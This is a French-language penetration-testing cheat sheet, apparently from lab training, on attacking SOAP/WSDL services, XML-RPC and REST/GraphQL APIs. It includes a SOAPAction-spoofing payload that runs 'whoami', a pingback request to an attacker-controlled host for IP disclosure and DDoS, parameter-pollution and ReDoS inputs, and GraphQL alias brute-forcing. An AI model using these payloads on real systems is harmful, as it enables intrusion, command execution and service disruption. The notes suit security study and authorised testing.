
- [[#Web Services]]
- [[#API]]

---
# Web Services


- [ ] [[#Web Services Description Language WSDL]]
- [ ] [[#SOAPAction Spoofing]]
- [ ] [[#Command Injection]]
- [ ] [[#XML-RPC]]

## Web Services Description Language #WSDL

> [!Formes de fichier WSDL possibles]
> `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`

Si découverte d'un fichier wsdl vide, fuzz les paramètres:

```bash
ffuf -u 'http://10.129.72.227:3002/wsdl?FUZZ' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```


## SOAPAction Spoofing

> [!TIP]
> Si un service web ne prend en compte que l'attribut SOAPAction pour déterminer l'opération à exécuter, il peut être vulnérable à l'usurpation de SOAPAction.

Exploitation en envoyant une requête POST:

```bash
curl -X POST http://10.129.72.227:3002/wsdl -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>' -H 'SOAPAction: "ExecuteCommand"'
```

Exploitation avec un script Python

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```


---

## [[Command Injection]]


---

## XML-RPC

```BASH
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

### Pingback.ping Méthode

> [!TIP]
>  
> - Permet d'identifier l'IP publique (intéressant si derrière un cloudflare) -> doit pointer vers un VPS contrôlé par l'attaquant.
> - Cross-Site Port Attack (XSPA) -> permet d'identifier les ports ouverts sur la machine en pointant vers lui même (regarder les réponses / différence de temps eentree elles)
> - DDoS

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```


---
# API

- [ ] [[#0. Methodo (Recon)]]

- [ ] [[#1. Identifier Swagger]]
- [ ] [[#2. Fuite d'informations]]
- [ ] [[#3. Verb Tampering & Content Types]]
- [ ] [[#4. Broken Object Property Level Authorization]]
- [ ] [[#5. Broken Object Level Authorization (IDOR)]]
- [ ] [[#6. Broken Authentication]]
- [ ] [[#7. Server Side Parameter Pollution]]
- [ ] [[#8. Unrestricted Resource Consumption]]
- [ ] [[#9. Broken Function Level Authorization]]
- [ ] [[#10. Unrestricted Access to Sensitive Business Flows]]
- [ ] [[#11. Server-Side Request Forgery (SSRF)]]
- [ ] [[#12. Security Misconfiguration]]
- [ ] [[#13. Improper Inventory Management]]
- [ ] [[#14. Unsafe Consumption of APIs]]
- [ ] [[#Tester XSS (Cross-Site Scripting)]]
- [ ] [[#Tester XXE Injection]]
- [ ] [[#Regular Expression Denial of Service (ReDoS)]]

- [ ] [[#GRAPHQL]]



## 0. Methodo (Recon)

1. Identifier si un Swagger est présent (Documentation de l'API)
2. Identifier les endpoints de l'API et les paramètres associés
3. Identifier les méthodes HTTP supportées (Verb Tampering) et le format des fichiers supportés
4. Identifier s'il y a du rate limiting et des mecanismes d'authentification

## 1. Identifier Swagger

Identifier si la documentation de l'API est exposée.

wordlist :

```
openapi.json
api/
api/apidocs/swagger.json
api/spec/swagger.json
api/swagger
api/swagger/index.html
api/swagger.json
api/swagger/static/index.html
api/swagger/swagger
api/swagger/ui/index
api/swagger.yaml
api/swagger.yml
api/v1/swagger.json
api/v1/swagger.yaml
api/v2/swagger.json
api/v2/swagger.yaml
swagger-ui.html
swagger/
swagger/index.html
swagger.json
swagger-resources
swagger/v1/swagger.json
```

> [!Tip]
> Faire un scan de vuln avec Nuclei peut également réveler un swagger exposé

> [!Tip]
> Possible ensuite d'utiliser Burp crawler ou l'extension burp OpenAPI parser afin de mapper tous les endpoints et paramètres exposés via le swagger.


## 2. Fuite d'informations

> [!Objectif]
> Identifier les endpoints de l'API et les paramètres associés.

> [!Tip]
> Utiliser les wordlist d'endpoint d'API communs.
> Faire une wordlist basée sur les termes retrouvés sur l'application (cart, shop, product ...) 

Wordlist endpoint API:

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt

Fuzzing d'Endpoints:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u 'http://10.129.95.243:3000/api/FUZZ' -recursion -recursion-depth 4
```

Fuzzing de paramètres:

```bash
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
```

On peut aussi utiliser ParamMiner ou les Content Discovery Tools avec Burp


> [!Tip]
> Chercher egalement les endpoints exposés dans les fichiers js de l'application.
> On peut utiliser l'extension Burp JS Link Finder pour ça ou rechercher manuellement les /api avec les engagement tools -> search.
> Jouer manuellement avec l'application et utiliser le crawler de Burp pour être sur de ne rien manquer.


## 3. Verb Tampering & Content Types

Une fois les endpoints identifiés, les envoyer au repeater / intruder et :

- Tester [[HTTP Verb Tempering]] sur tous les endpoints afin d'identifier les méthodes supportées.
	- OPTIONS
	- PATCH
	- HEAD
	- POST
	- ...

- Identifier les formats de fichiers (Content Types) acceptés. **(Utiliser l'extension Content Type converter pour convertir les données envoyées en JSON en XML)**

> [!Tip]
> Etre attentif aux messages d'erreur et reponses afin de construire nos requetes



## 4. Broken Object Property Level Authorization

### CWE-915: Mass Assignement


1. Identifier des paramètres associés aux objets (par exemple l'objet user qui aurait un paramètre "isAdmin")

2. Tester de rajouter des paramètres existants dans des requetes en injectant une valeure inattendue (string au lieu de int par ex) afin de voir si cela génère une erreur dans un premier temps, puis mettre une valeure attendue par l'application(création de compte en précisant un paramètre précédemment identifié "isAdmin":true / modifier le prix d'un produit lors de son ajout au panier par exemple...)

Chain avec le Verb Tempering.


### CWE-213: Excessive Data Exposure

Identifier des données personnelles telles que @mail ou num de tel dans les suppliers / customers par exemple.



## 5. Broken Object Level Authorization (IDOR)

### CWE-639: Authorization Bypass Through User-Controlled Key

[[IDOR (Insecure Direct Object References)#Insecure APIs]]


## 6. Broken Authentication

### CWE-307: Improper Restriction of Excessive Authentication Attempts

[[BROKEN AUTHENTICATION#Brute Force]]



## 7. Server Side Parameter Pollution

> [!Objectif]
> Certaines applications n'exposent pas l'API sur internet, mais les requêtes passées coté client vont interroger une api en interne. Voir si des caractères spéciaux sont bien encodés afin de manipuler le comportement de l'application et accéder à des données non autorisées.

> [!Tip]
> Utiliser l'extension Backslash Powered Scanner ou identifier 
> les "suspicious input transformations" avec le scan actif de Burp peut aider à identifier cette vulnerabilité, à tester manuellement après.
> 


Tronquer la requete avec un `#` URL encodé peut permettre de ne pas prendre en compte d'autres paramètres normalement associés automatiquement :

```url-encode
value%23FOO
```

Injecter des paramètres invalides puis paramètres valides avec un `&` URL encodé et voir comment le seveur réagit (On peut fuzz avec intruder et la wordlist predefinie `server side variable names`):

```url-encode
value%26invalidparameter=xyz
value%26validparam=xyz
```

Tester d'override le paramètre original (le mettre en doublon) avec un `&` URL encodé afin de voir s'il est pris en compte par l'application, cela pourrait permettre d'accéder à des données non autorisées:

```
%26name=administrator
```

A noter : 
- PHP interprete le second paramètre seulement
- ASP combine les 2
- JS interprete le premier uniquement


Tester path traversal egalement (Si possible tenter de recupérer la documentation de l'API en fuzzant les endpoints communs, penser à mettre un %23 pour tronquer à la fin):

```
name=peter%2f..%2fadmin
```


Tester d'injecter des paramètres JSON dans la requete, exemple avec l'edition d'un nom d'utilisateur :

```
peter","access_level":"administrator
peter\",\"access_level\":\"administrator
```

pourrait envoyer à l'API

```
PATCH /users/7312/update {name="peter","access_level":"administrator"}
```

Peut fonctionner avec n'importe quel format de données (XML...)


## 8. Unrestricted Resource Consumption

### CWE-400: Uncontrolled Resource Consumption

> [!TIP]
> A web API is vulnerable to `Unrestricted Resource Consumption` if it fails to limit user-initiated requests that consume resources such as `network bandwidth`, `CPU`, `memory`, and `storage`
> 

1. Tenter d'upload un fichier volumineux pour voir la réponse du serveur.

Créer fichier de 30mb
```shell
dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
```

2. Tenter d'upload un fichier qui ne correspond pas au format requis -> reverseshell en .exe par exemple -> [[FILE UPLOAD]]

3. Tenter de spam requêtes sur les endpoints pour voir la réaction du server


## 9. Broken Function Level Authorization

### CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Tester les endpoints qui necessite une autorisation pour identifier ceux qui autorisent tout de même les users qui n'en ont pas.


## 10. Unrestricted Access to Sensitive Business Flows

Suite au CWE-200: Exposure of Sensitive Information to an Unauthorized Actor -> Cela révèle-t-il des données ayant un impact significatif sur le business de l'entreprise tel que des dates de réductions sur les prix, qui couplé à CWE-400: Uncontrolled Resource Consumption pourrait mener au vidage des stocks par un acteur malveillant sur ces dates par ex ?


## 11. Server-Side Request Forgery (SSRF)

### CWE-918 : Server-Side Request Forgery (SSRF)

Identifier fichiers locaux inclus et tenter LFI par ex...

- [[SSRF (Server-Side Request Forgery)]]
- [[FILE INCLUSION]]



## 12. Security Misconfiguration

### CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Tester [[SQLi (Injections SQL)]] dans les paramètres (également dans les paramètres SOAP).

### HTTP Headers

CORS (Cross-origin resource sharing) Policy ? ([Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) ...)

Inclure Origin header et identifier le header de la réponse -> ``-H "Origin: *"``

Si [Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) = * -> Tester [[CSRF - XSRF (Cross-Site Request Forgery)]]


## 13. Improper Inventory Management

Identifier une autre version de l'API (v0 par exemple) qui ne serait plus maintenue et tester les vulnérabilités précédentes dessus

```bash
curl http://83.136.253.198:41733/swagger/v0/swagger.json | jq
```


## 14. Unsafe Consumption of APIs

Several critical vulnerabilities can arise from API-to-API communication

1. `Insecure Data Transmission`: APIs communicating over unencrypted channels expose sensitive data to interception, compromising confidentiality and integrity.
2. `Inadequate Data Validation`: Failing to properly validate and sanitize data received from external APIs before processing or forwarding it to downstream components can lead to injection attacks, data corruption, or even remote code execution.
3. `Weak Authentication`: Neglecting to implement robust authentication methods when communicating with other APIs can result in unauthorized access to sensitive data or critical functionality.
4. `Insufficient Rate-Limiting`: An API can overwhelm another API by sending a continuous surge of requests, potentially leading to denial-of-service.
5. `Inadequate Monitoring`: Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.


[CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)



## Tester [[XSS (Cross-Site Scripting)]]


## Tester [[XXE Injection]]


## Regular Expression Denial of Service (ReDoS)

https://regex101.com/
https://devina.io/redos-checker

Tester une valeur comme et voir si temps de réponse plus long

```
jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.
```




## GRAPHQL

> [!C'est quoi]
> GraphQL est **un langage de requêtes** de données pour API. QL, comme dans SQL, veut dire Query Language. **GraphQL permet de manipuler de la donnée de façon simple, flexible et très précise.** GraphQL n’est pas un langage de programmation ou un framework. GraphQL est une [spécification](https://graphql.github.io/graphql-spec/) pour implémenter ton API. Toutes les requetes envoyées à l'API passent par un unique endpoint.


[[#1. Recon]]
[[#2. IDOR]]
[[#3. Introspection query]]

[[#Bypass Introspection defenses]]
[[#Bypass bruteforce protections]]
[[#CSRF]]


### 1. Recon

> [!Tip]
> Burp Scanner identifie automatiquement les endpoints GraphQL. Lancer un scan actif également afin d'assurer la détection.

Envoyer une requete POST à ces endpoints avec `Content-Type: application/json` et en data `query{__typename}`

```
/graphql
/internal/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/graphql/v1
/api/v1
/api/graphql/v1
/graphql/api/v1
/graphql/graphql/v1
```

Ou tester wordlist : `/usr/share/seclists/Discovery/Web-Content/graphql.txt`

La response doit contenir `{"data": {"__typename": "query"}}`

Si ça ne donne aucun resultat, tester avec `Content-Type: x-www-form-urlencoded` avec les méthodes POST, GET, OPTIONS...

Tester d'envoyer une requête GET à l'endpoint api/

```
GET /api?query=query{__typename}
```



### 2. IDOR

Tester les IDOR

ex: 

Le serveur renvoie une liste de produits comme ceci

```graphQL
{ 
	"data": { 
		"products": [ 
			{ 
				"id": 1, 
				"name": "Product 1", 
				"listed": true 
			}, 
			{ 
				"id": 2,
				"name": "Product 2", 
				"listed": true 
			}, 
			{ 
				"id": 4, 
				"name": "Product 4", 
				"listed": true 
			} 
		] 
	} 
}
```

On note que le produit avec l'id 3 est manquant, on peut tenter de le récupérer avec la requete suivante :

```graphQL
query { 
	product(id: 3) { 
		id 
		name
		listed
	} 
}
```



## 3. Introspection query

> [!Utilité]
> Permet d'obtenir des informations sur le schema de l'API afin de mieux comprendre comment intéragir avec elle. Peut faire fuiter des données sensibles.

> [!Attention]
> Les requêtes d'introspection doivent être désactivées en environnement de production, si c'est accessible, c'est un problème à remonter.


Identifier si on peut faire des requêtes d'introspection -> obtenir le nom de toutes les requêtes d'introspection possibles

```graphQL
{ 
	"query": "{__schema{queryType{name}}}" 
}
```


Puis lancer une requête d'introspection complète (tester sans les onOperation , onField et onFragment si ça ne fonctionne pas)

```
{
"query": "query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
      onOperation   # Often needs to be deleted to run query
      onFragment    # Often needs to be deleted to run query
      onField       # Often needs to be deleted to run query
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}"
}
```

Interpreter les resultats avec un GraphQL vizualiser http://nathanrandal.com/graphql-visualizer/
ou https://apis.guru/graphql-voyager/ afin de visualiser les relations entre les objets.

Si les requêtes d'intropsection sont desactivées, possible d'utiliser des suggestions avec Clairvoyance https://github.com/nikitastupin/clairvoyance (ou Burp Scanner)

> [!Attention]
> Certains endpoints peuvent être cachés, ne pas se baser que sur le visualizer



## Bypass Introspection defenses

Tenter d'insérer les caractères spéciaux `espace, new line ou virgule` après le mot clé `__schema` dans la requête pour casser une potentielle regex. Ces caractères spéciaux ne sont par interprétés par graphQL.

Tenter content-type : x-www-form-urlencoded.

Tenter Verb Tampering -> Passer en GET, OPTIONS ...


## Bypass bruteforce protections

On peut utiliser les alias pour bypass les mecanismes anti bruteforce et envoyer toutes nos tentatives dans une seule requête

Exemple avec une requête de login :

```
query login {
bruteforce1:login(input:{password: "princess", username: "carlos"}) {
        token
        success
    }
    
bruteforce2:login(input:{password: "another1", username: "carlos"}) {
        token
        success
    }

bruteforce3:login(input:{password: "encore", username: "carlos"}) {
        token
        success
    }
    
...

}
```

Tool à tester pour le cracking -> https://github.com/nicholasaleks/CrackQL


## CSRF

> [!Tip]
> Si le content type **application/json** n'est pas vérifié par le serveur et jeton anti CSRF mal implémenté (ou absent), alors on peut faire une CSRF classique avec le content-type **application/x-www-form-urlencoded**
> 


